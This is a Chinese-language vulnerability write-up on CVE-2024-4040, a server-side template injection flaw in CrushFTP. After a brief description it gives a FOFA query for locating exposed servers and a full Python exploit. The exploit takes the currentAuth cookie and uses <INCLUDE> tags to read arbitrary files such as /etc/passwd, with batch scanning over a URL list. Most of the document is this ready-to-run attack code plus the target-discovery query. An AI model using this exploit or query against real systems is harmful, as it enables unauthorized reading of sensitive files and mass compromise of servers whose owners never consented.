# CrushFTP-服务器端模板注入漏洞(CVE-2024-4040)

### <font style="color:rgba(0, 0, 0, 0.85);">漏洞描述</font>
<font style="color:rgb(119, 119, 119);">由于CrushFTP 存在服务器端模板注入漏洞，未经身份验证的远程攻击者可以逃避虚拟文件系统(VFS)沙箱，绕过身份验证获得管理访问权限，泄露敏感信息或执行代码。目前该漏洞技术细节与PoC已在互联网上公开，鉴于该漏洞影响范围较大，建议客户尽快做好自查及防护</font>

### <font style="color:rgba(0, 0, 0, 0.85);">漏洞复现</font>
<font style="color:rgb(119, 119, 119);">1、fofa</font>

```plain
server="CrushFTP" || header="/WebInterface/login.html" || banner="/WebInterface/login.html" || header="/WebInterface/w3c/p3p.xml" || banner="/WebInterface/w3c/p3p.xml" || title="CrushFTP"
```

<font style="color:rgb(119, 119, 119);">5、py(python exploit.py -f url.txt -p /etc/passwd)</font>

```plain
import requests
import argparse

HEADER = '\033[95m'
OKBLUE = '\033[94m'
OKCYAN = '\033[96m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'

def get_cookies(url):
	try:
		session = requests.Session()
		session.get(url, timeout=10)  # 设置超时时间为10秒
		return session.cookies.get_dict()
	except requests.exceptions.RequestException:
		print(FAIL + "Connection Error" + ENDC)

def exploit(url, cookies, path):
	try:
		url = url + "/WebInterface/function/?command=zip&c2f=" + cookies['currentAuth'] + "&path=<INCLUDE>" + path + "</INCLUDE>&names=*"
		request = requests.get(url, cookies=cookies, timeout=10)  # 设置超时时间为10秒
		return request.text
	except requests.exceptions.RequestException:
		print(FAIL + "Connection Error" + ENDC)

if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	group = parser.add_mutually_exclusive_group(required=True)
	group.add_argument("-u", "--url", help="URL of the target")
	group.add_argument("-f", "--file", help="Path to the file containing URLs to scan")
	parser.add_argument("-p", "--path", help="Path to the file to read", required=True)
	args = parser.parse_args()

	if args.file:
		# 批量扫描
		file_path = args.file
		with open(file_path, 'r') as f:
			urls = f.read().splitlines()
		for url in urls:
			cookies = get_cookies(url)
			if cookies and cookies.get('currentAuth'):
				print(OKCYAN + "Scanning: " + url + ENDC)
				result = exploit(url, cookies, args.path)
				if result:
					print(result)
				print()
			else:
				print(WARNING + "Not vulnerable: " + url + ENDC)
				print()

	elif args.url:
		# 单个URL扫描
		url = args.url
		path = args.path
		if not url.startswith("http"):
			print(WARNING + "URL should start with http or https" + ENDC)
			quit()
		cookies = get_cookies(url)
		if cookies and cookies.get('currentAuth'):
			print(OKCYAN + exploit(url, cookies, path) + ENDC)
		else:
			print(WARNING + "Not vulnerable: " + url + ENDC)
```
